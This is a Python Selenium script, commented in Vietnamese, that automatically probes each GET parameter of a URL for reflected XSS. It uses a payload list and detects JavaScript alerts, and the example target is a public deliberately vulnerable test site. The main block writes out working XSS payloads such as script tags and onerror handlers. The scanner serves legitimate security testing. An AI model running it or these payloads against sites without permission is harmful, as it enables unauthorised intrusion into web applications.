import os
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.common.exceptions import TimeoutException, NoAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests # Thêm thư viện requests để dễ dàng lấy nội dung từ URL

# --- Configuration ---
PAYLOADS_FILENAME = "payloads.txt" # Tên file chứa payload
ALERT_WAIT_TIMEOUT = 1     # Thời gian chờ alert xuất hiện (giây)
POST_ACCEPT_SLEEP = 0.5    # Thời gian chờ sau khi accept alert (giây)

def build_test_url(base_url: str, param_name: str, payload: str) -> str:
    """
    Ghép thêm param_name=payload vào base_url, tự động xử lý
    & hoặc ? tùy base_url đã có query hay chưa.
    """
    parsed = urlparse(base_url)
    # Lấy danh sách các cặp key-value hiện có từ query string
    qlist = parse_qsl(parsed.query, keep_blank_values=True)
    # Ghi đè giá trị của param_name nếu nó đã tồn tại, hoặc thêm mới
    # Điều này đảm bảo chúng ta chỉ kiểm tra param_name với payload hiện tại
    # mà không bị ảnh hưởng bởi giá trị gốc của nó trong base_url.
    qlist_updated = [(k, v) for k, v in qlist if k != param_name]
    qlist_updated.append((param_name, payload))
    new_query = urlencode(qlist_updated)
    return urlunparse(parsed._replace(query=new_query))

def run_test(driver: WebDriver, target_url: str):
    """
    Kiểm tra reflected XSS trong tham số GET lấy từ chính target_url,
    sử dụng payloads từ file payloads.txt.
    """
    print(f"--- Running test: Reflected XSS on {target_url} ---")

    script_dir = Path(__file__).parent.resolve()
    payloads_file_path = script_dir / PAYLOADS_FILENAME # Đường dẫn file payload

    # --- Lấy Parameters từ URL ---
    try:
        parsed_url = urlparse(target_url)
        query_params = parse_qsl(parsed_url.query, keep_blank_values=True)
        # Lấy danh sách các tên tham số (key) duy nhất từ URL
        param_names = sorted(list(set(key for key, value in query_params))) # Lấy key duy nhất và sắp xếp

        if not param_names:
            return False, f"Không tìm thấy tham số nào trong query string của URL: {target_url}"
        print(f"Found {len(param_names)} parameters in URL to test: {', '.join(param_names)}")

    except Exception as e:
        return False, f"Lỗi khi phân tích URL '{target_url}' để lấy tham số: {e}"

    # --- Đọc Payloads ---
    try:
        # Kiểm tra xem PAYLOADS_FILENAME là URL hay file path
        if PAYLOADS_FILENAME.startswith(('http://', 'https://')):
            print(f"Fetching payloads from URL: {PAYLOADS_FILENAME}")
            response = requests.get(PAYLOADS_FILENAME)
            response.raise_for_status() # Ném lỗi nếu request không thành công (e.g., 404)
            payloads = [line.strip() for line in response.text.splitlines() if line.strip()]
        else:
            payloads_file_path = script_dir / PAYLOADS_FILENAME
            print(f"Reading payloads from file: {payloads_file_path}")
            with open(payloads_file_path, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]

        if not payloads:
             # Phân biệt thông báo lỗi dựa trên nguồn payloads
            source_type = "URL" if PAYLOADS_FILENAME.startswith(('http://', 'https://')) else "file"
            return False, f"Nguồn payload ({source_type} '{PAYLOADS_FILENAME}') rỗng hoặc không chứa payload hợp lệ."
        print(f"Loaded {len(payloads)} payloads.")

    except FileNotFoundError:
         # Chỉ áp dụng nếu là file
        return False, f"Không tìm thấy file payload '{payloads_file_path}'."
    except requests.exceptions.RequestException as e:
        # Bắt lỗi liên quan đến request URL payload
        return False, f"Lỗi khi tải payloads từ URL '{PAYLOADS_FILENAME}': {e}"
    except Exception as e:
         # Lỗi chung khác
        source_type = "URL" if PAYLOADS_FILENAME.startswith(('http://', 'https://')) else "file"
        return False, f"Lỗi khi đọc/xử lý payloads từ {source_type} '{PAYLOADS_FILENAME}': {e}"


    vulnerable_combination = None # Lưu (param, payload, alert_text) nếu tìm thấy
    found_vulnerability = False # Cờ để dừng sớm

    # --- Vòng lặp kiểm tra ---
    original_parsed_url = urlparse(target_url) # Phân tích URL gốc một lần

    for param in param_names:
        if found_vulnerability: # Nếu đã tìm thấy lỗ hổng, không cần kiểm tra param khác
            break
        print(f"\nTesting parameter: '{param}'")

        for payload in payloads:
            # Tạo URL test dựa trên URL gốc và payload hiện tại
            # Điều này quan trọng để không tích lũy payload từ vòng lặp trước
            test_url = build_test_url(target_url, param, payload)

            payload_preview = payload[:60] + '...' if len(payload) > 60 else payload
            print(f"  Trying payload: '{payload_preview}'")
            print(f"  Testing URL: {test_url}") # <<< DÒNG NÀY ĐÃ ĐƯỢC BỎ COMMENT

            try:
                driver.get(test_url)
                try:
                    WebDriverWait(driver, ALERT_WAIT_TIMEOUT).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    print(f"  Alert detected! Text: '{alert_text}'")
                    alert.accept()
                    print(f"  Alert accepted. Sleeping {POST_ACCEPT_SLEEP}s...")
                    time.sleep(POST_ACCEPT_SLEEP)

                    try:
                        # Cố gắng lấy origin một cách an toàn hơn
                        origin = driver.execute_script(
                            "try { return window.location.origin; } catch (e) { return null; }"
                        )
                        if origin is None:
                             print(f"  WARNING: Không thể lấy origin sau khi accept alert (trang có thể đã điều hướng hoặc đóng).")
                             # Vẫn có thể coi là thành công nếu alert xuất hiện, tùy thuộc vào yêu cầu
                             # Ở đây ta vẫn yêu cầu khớp origin
                             continue # Chuyển sang payload tiếp theo


                    except Exception as err:
                        print(f"  WARNING: Lỗi khi thực thi script lấy origin: {err}")
                        continue # Chuyển sang payload tiếp theo

                    # Sửa đổi điều kiện kiểm tra: chỉ cần alert xuất hiện là thành công
                    # Hoặc bạn có thể giữ nguyên kiểm tra origin nếu muốn
                    # if alert_text == origin: # Kiểm tra origin cũ
                    print(f"  SUCCESS: XSS found! Parameter='{param}', Payload='{payload}' triggered an alert ('{alert_text}').")
                    vulnerable_combination = (param, payload, alert_text)
                    found_vulnerability = True
                    break # Dừng thử các payload khác cho param này
                    # else:
                    #     print(f"  WARNING: Alert text ('{alert_text}') does not match origin ('{origin}').")


                except TimeoutException:
                    pass # Không có alert, tiếp tục
                except NoAlertPresentException:
                    print("  WARNING: Alert disappeared before interaction.")

            except Exception as e:
                print(f"  ERROR testing param '{param}' with payload '{payload_preview}': {e}")
                if "unexpected alert open" in str(e).lower():
                    try:
                        print("  Attempting to dismiss unexpected alert...")
                        alert = driver.switch_to.alert
                        alert.dismiss()
                        time.sleep(POST_ACCEPT_SLEEP)
                        print("  Unexpected alert dismissed.")
                    except NoAlertPresentException:
                        print("  No alert found to dismiss.")
                    except Exception as alert_err:
                        print(f"  Error dismissing unexpected alert: {alert_err}")

            if found_vulnerability:
                break

    # --- Kết quả cuối cùng ---
    print("\n--- Test finished ---")
    if vulnerable_combination:
        param, payload, alert_text_final = vulnerable_combination
        success_message = (f"Found Reflected XSS!\n"
                           f"  Parameter: '{param}'\n"
                           f"  Payload: '{payload}'\n"
                           f"  Alert Text: '{alert_text_final}'") # Bỏ phần (matched origin) nếu không còn check
        return True, success_message
    else:
        # Thay đổi thông báo kết quả để phù hợp với logic mới
        return False, "No reflected XSS detected that triggered an alert with the provided payloads."
        # return False, "No reflected XSS detected with the provided parameters and payloads matching alert(origin)." # Thông báo cũ

# ----- Ví dụ cách sử dụng (nếu chạy script trực tiếp) -----
if __name__ == "__main__":
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager

    # --- Cấu hình WebDriver ---
    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    # options.add_argument('--ignore-certificate-errors')

    service = Service(ChromeDriverManager().install())
    driver = None

    # URL này chứa tham số 'cat' sẽ được tự động phát hiện và kiểm tra
    target_url_to_test = "http://testphp.vulnweb.com/listproducts.php?cat=1&sort=name" # Ví dụ URL có 2 tham số

    # Có thể đặt PAYLOADS_FILENAME thành URL ở đây nếu muốn
    # PAYLOADS_FILENAME = "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt"

    # --- Tạo file payload ví dụ (nếu chưa có) ---
    script_dir = Path(__file__).parent.resolve()
    example_payloads_file = script_dir / PAYLOADS_FILENAME

    # Chỉ tạo file payload nếu PAYLOADS_FILENAME không phải là URL
    if not PAYLOADS_FILENAME.startswith(('http://', 'https://')):
        if not example_payloads_file.exists():
            print(f"Tạo file ví dụ '{PAYLOADS_FILENAME}'...")
            with open(example_payloads_file, 'w', encoding='utf-8') as f:
                f.write("<script>alert(document.domain)</script>\n")
                f.write("'><script>alert(window.origin)</script>\n") # Thay đổi để khớp với check origin
                f.write("<img src=x onerror=alert(window.origin)>\n") # Thay đổi để khớp với check origin
                f.write("<svg/onload=alert(window.origin)>\n") # Thay đổi để khớp với check origin
                f.write("<svg/onload=alert(1)>\n") # Payload này sẽ không khớp origin (nếu check)

    # --- Chạy kiểm thử ---
    try:
        print("Initializing WebDriver...")
        driver = webdriver.Chrome(service=service, options=options)
        print("WebDriver initialized.")

        # Bây giờ chỉ cần truyền URL, các tham số sẽ được tự động lấy từ đó
        success, message = run_test(driver, target_url_to_test)

        print("\n====== TEST RESULT ======")
        print(f"Success: {success}")
        print(f"Message: {message}")
        print("=========================")

    except Exception as e:
        print(f"\nAn error occurred during execution: {e}")
    finally:
        if driver:
            print("Quitting WebDriver...")
            driver.quit()
            print("WebDriver quit.")